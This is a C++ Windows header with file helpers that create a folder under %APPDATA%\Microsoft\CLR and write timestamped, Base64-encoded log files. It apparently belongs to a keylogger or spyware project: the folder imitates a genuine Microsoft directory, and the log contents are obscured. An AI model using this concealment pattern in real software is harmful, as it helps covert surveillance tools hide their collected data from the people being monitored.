#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include <windows.h>
#include "Helper.h"
#include "Base64.h"

namespace IO
{
    std::string GetOurPath(const bool append_seperator = false)
    {
        std::string appdata_dir(getenv("APPDATA"));
        std::string full = appdata_dir + "\\Microsoft\\CLR";
        return full + (append_seperator ? "\\" : "");
    }

    bool MkOneDr(const std::string &path) {
        DWORD err;
        if (CreateDirectory(path.c_str(), nullptr))
            return true;
        err = GetLastError();
        return err == ERROR_ALREADY_EXISTS;
    }

    bool MKDir(std::string path) {
        if (!path.empty() && path.back() == '\\')
            path.pop_back();                // no trailing backslash

        size_t start = (path.size()>1 && path[1]==':') ? 2 : 0;  // skip "C:"

        for (size_t i = start; i < path.size(); ++i) {
            if (path[i] == '\\') {
                std::string sub = path.substr(0, i);
                if (!MkOneDr(sub))
                    return false;
            }
        }
        return MkOneDr(path);               // finally make the full folder
    }

    template <class T>
    std::string WriteLog(const T &t )
    {
        std::string path = GetOurPath(true);
        Helper::DateTime dt;
        std::string name = dt.GetDateTimeString("_") + ".log";

        try
        {
            std::ofstream file(path + name);
            if(!file) return "";
            std::ostringstream s;
            s << "[" << dt.GetDateTimeString() << "]" << std::endl << t << std::endl;
            std::string data = Base64::EncryptB64(s.str());
            file << data;
            if(!file)
                return "";
            file.close();
            return name;
        }
        catch(...)
        {
            return "";
        }
    }
}

#endif // IO_H
